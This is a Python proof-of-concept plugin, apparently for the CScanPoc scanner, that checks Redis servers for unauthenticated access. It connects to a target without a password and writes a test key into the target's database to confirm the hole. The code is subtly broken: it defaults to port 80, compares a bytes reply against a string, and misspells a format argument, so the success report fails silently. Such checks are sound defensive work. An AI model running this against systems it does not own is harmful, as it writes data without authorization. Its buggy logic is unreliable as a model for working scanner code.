# coding: utf-8
import redis
import socket
import urllib.parse

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'Redis_0101'  # 平台漏洞编号，留空
    name = 'Redis 未授权访问'  # 漏洞名称
    level = VulnLevel.MED  # 漏洞危害级别
    type = VulnType.OTHER  # 漏洞类型
    disclosure_date = '2015-08-11'  # 漏洞公布时间
    desc = '''
    Redis默认安装后无需口令可远程连接，并且可以使用redis命令更改写入文件的目录及类型，从而导致一系列安全问题。
    '''  # 漏洞描述
    ref = 'http://www.secpulse.com/archives/5357.html'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Redis'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'a0f3ef32-4b9e-4018-ac11-ff04cc008397'  # 平台 POC 编号，留空
    author = 'hyhmnn'  # POC编写者
    create_date = '2018-05-29'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            target_parse = urllib.parse.urlparse(self.target)
            p = target_parse.port if target_parse.port else 80
            ip_addr = socket.gethostbyname(target_parse.hostname)

            r = redis.Redis(host=ip_addr, port=p, db=0)
            ret1 = r.set('name', 'stefan')
            ret2 = r.get('name')
            if ret1 & (ret2 in 'stefan'):
                self.output.report(self.vuln, '发现{target}({ip}:{port})存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name, ip=ip_addr, prot=p))
        except Exception as e:
            self.output.info('执行异常：{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
